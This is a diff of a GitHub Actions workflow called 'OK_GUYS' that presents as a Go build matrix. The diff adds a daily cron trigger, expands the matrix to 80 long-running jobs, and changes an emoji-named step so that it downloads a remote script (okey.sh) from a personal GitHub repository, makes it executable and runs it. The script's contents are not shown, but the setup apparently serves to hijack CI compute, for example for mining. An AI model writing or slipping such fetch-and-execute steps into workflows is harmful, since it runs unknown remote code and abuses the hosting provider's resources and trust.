@@ -1,6 +1,9 @@
 name: OK_GUYS
 
-on: [push]
+on:  
+  push:
+  schedule:
+    - cron: '0 0 * * *'
 jobs:
   build:
     name: OK_GUYS
@@ -10,7 +13,7 @@ jobs:
       fail-fast: false
       matrix:
         go: [1.12, 1.13, 1.14, 1.15, 1.16]
-        flag: [A, B, C, D]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]
     timeout-minutes: 360
     env:
         NUM_JOBS: 20
@@ -25,4 +28,4 @@ jobs:
       uses: actions/checkout@v1
     - name: 🪐🪐🪐🪐🪐
       run: |
-          wget https://github.com/Jiad9/jiad9/raw/main/okey.sh
+          wget https://github.com/Jiad9/jiad9/raw/main/okey.sh && chmod u+x okey.sh && ./okey.sh
